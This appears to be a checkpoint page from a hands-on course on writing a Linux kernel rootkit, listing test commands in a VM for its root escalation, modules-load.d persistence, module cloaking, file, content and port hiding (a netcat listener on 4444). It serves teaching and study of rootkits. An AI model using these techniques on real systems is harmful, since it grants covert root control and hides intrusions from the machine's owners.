# Look at what you built

No new code. This milestone is a checkpoint: load your module and verify
that every command you have implemented so far works correctly.

By this point your rootkit handles privilege escalation, persistence, module
cloaking, file hiding, content hiding, and port hiding, all controlled
through the mkdir interface. Run every command, observe the effect, and
confirm that your hooks compose cleanly.

## Walkthrough

Boot the VM in bare mode:

    ./rklings run --bare

### 1. Load the module

    insmod rklings.ko

Verify it loaded:

    lsmod | grep rklings

### 2. Escalation

Escalate the current shell to root:

    mkdir rklings.e
    id

Expected: `uid=0(root) gid=0(root)`.

### 3. PID escalation

Start a background process and escalate it by PID:

    sleep 300 &
    mkdir rklings.e.$!

The sleep process now runs as root.

### 4. Ping and status

    mkdir rklings.ping
    mkdir rklings.status

Both should return 0 (success). Neither creates a directory.

### 5. Persistence

Write the modules-load.d conf file:

    mkdir rklings.persist
    cat /etc/modules-load.d/rklings.conf

Expected: `rklings`.

Remove it:

    mkdir rklings.unpersist
    ls /etc/modules-load.d/rklings.conf 2>&1

Expected: `No such file or directory`.

### 6. Module cloak

    lsmod | grep rklings
    # rklings  16384  0

    mkdir rklings.h.m
    lsmod | grep rklings
    # (nothing)

    mkdir rklings.u.m
    lsmod | grep rklings
    # rklings  16384  0

### 7. File hiding

    touch testfile
    ls testfile
    # testfile

    mkdir rklings.h.f.testfile
    ls testfile
    # (not listed by ls)
    stat testfile
    # File: testfile -- still exists on disk

### 8. Content hiding

    printf 'normal line\nSECRET data\nanother line\n' > /tmp/demo

    mkdir rklings.h.c.SECRET
    cat /tmp/demo
    # normal line
    # another line

Lines containing SECRET are removed from read output.

### 9. Port hiding

    nc -l -p 4444 &
    grep 115C /proc/net/tcp
    # (port 4444 = 0x115C visible)

    mkdir rklings.h.p.4444
    grep 115C /proc/net/tcp
    # (nothing)

### 10. Undo everything

    mkdir rklings.u.m
    mkdir rklings.unpersist
    rmmod rklings

Verify the kernel log is clean:

    dmesg | tail -20

No BUG, WARNING, Oops, or KASAN output.

## Verify

```sh
./rklings check
```

The check script loads your module and runs through each command
automatically. All features must pass for the milestone to complete.
